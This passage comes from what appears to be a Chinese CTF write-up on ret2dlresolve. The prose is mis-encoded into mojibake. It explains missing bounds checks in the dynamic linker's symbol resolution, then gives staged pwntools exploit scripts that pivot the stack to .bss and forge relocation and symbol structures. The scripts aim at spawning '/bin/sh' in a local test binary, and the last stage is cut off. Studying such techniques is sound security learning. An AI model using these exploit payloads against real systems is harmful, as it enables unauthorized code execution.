<code>Elf32_Sym</code> ç»“æ„ä½“,è®°ä½œ <code>sym</code></li><li> <code>.dynstr + sym -&gt; st_name</code> å¾—å‡ºç¬¦å·è¡¨çš„å­—ç¬¦ä¸²æŒ‡é’ˆ</li><li> åœ¨ <code>libc</code> ä¸­æŸ¥æ‰¾ <code>.synstr[sym-&gt;st_name]</code> çš„åœ°å€,å¹¶ä¸”å†™å…¥ <code>rel -&gt; r_offset</code> å³ <code>got</code>è¡¨ä¸­</li><li> è°ƒç”¨è¿™ä¸ªå‡½æ•°</li></ol><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>é—®é¢˜ç‚¹åœ¨äºä½¿ç”¨ <code>.rel.plt + reloc_arg</code> çš„æ—¶å€™,å¹¶æ²¡æœ‰æ£€æŸ¥ æ˜¯å¦è¶Šç•Œ ,</p><p>å¦‚æœç»™å‡ºä¸€ä¸ªå¾ˆå¤§çš„ <code>offset</code> ä½¿å¾—è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘èƒ½å¤Ÿæ§åˆ¶çš„ç©ºé—´(<code>.bss</code>)</p><p>åœ¨ ä¼ªé€ çš„ <code>Elf32_Rel</code> ç»“æ„ä½“ä¸­,æ”¾å…¥ä¸€ä¸ª<code>r_info</code>å­—æ®µ,ä½¿å¾— <code>r_info = 0x??????07</code> å…¶ä¸­çš„ <code>??????</code> æ˜¯ç›¸å¯¹äº <code>.synsym</code> çš„ä¸‹æ ‡ <strong>(åç§» / 0x10)</strong>,è¿™é‡Œä¹Ÿæ²¡æœ‰è¶Šç•Œæ£€æŸ¥ , åŒæ ·å°†å…¶æŒ‡å‘ <code>.bss</code> æ®µ ä¼ªé€ ä¸€ä¸ª <code>Elf32_Sym</code> ç»“æ„ä½“</p><p>åœ¨ ä¼ªé€ çš„ <code>sym</code> ç»“æ„ä½“ä¸­ <code>st_name</code> è¶Šç•Œ <code>.symstr</code> ä¼ªé€ è™šå‡çš„å‡½æ•°ç¬¦å·</p><h3 id="å°è¯•ing"><a href="#å°è¯•ing" class="headerlink" title="å°è¯•ing"></a>å°è¯•ing</h3><h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>æ ˆè¿ç§»ä¹‹åæ§åˆ¶è¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">borrowStack()</span><br><span class="line">over1()COPY</span><br></pre></td></tr></table></figure><h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>æ ˆè¿ç§»ä¹‹åç”¨çœŸçš„ <code>Elf32_Rel</code> ç»“æ„ä½“å’Œåç§»å»æ‰§è¡Œ <code>write</code> å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span>            <span class="comment"># æ­£å¸¸çš„ä¸‹æ ‡</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">COPY</span><br></pre></td></tr></table></figure><h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>ä½¿ç”¨è¶Šç•Œçš„ä¸‹æ ‡,è®©<code>.rel.plt + reloc_arg</code> ä¸‹æ ‡è¶Šç•Œ,æŒ‡å‘ <code>.bss(stack) + 28</code> çš„åœ°æ–¹,å¹¶åœ¨é‚£é‡Œä¼ªé€ è™šå‡çš„<code>Elf32_Rel</code> ç»“æ„ä½“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">COPY</span><br></pre></td></tr></table></figure><h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>åœ¨ <a href="http://ethushiroha.com/?p=869#stage3">stage3</a> çš„åŸºç¡€ä¸Š, ç”¨ä¸€ä¸ªè¾ƒå¤§çš„ <code>offset</code> ä½¿å¾— <code>dynsym</code> ä¹Ÿè¢«ä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">    <span class="comment"># but why align ??</span></span><br><span class="line">    <span class="comment"># in order to fix 0x10(the size of fake struct) ?</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line">COPY</span><br></pre></td></tr></table></figure><h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>å¯¹ <code>st_name</code> è¶Šç•Œ,å¹¶ä¸”åœ¨ä¼ªé€ çš„ <code>dynsym</code> ç»“æ„ä½“ä¸‹é¢ä¼ªé€  <code>dynstr</code> å­—ç¬¦ä¸²</p><p>è¿™ä¸ªå­—ç¬¦ä¸²å°†å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 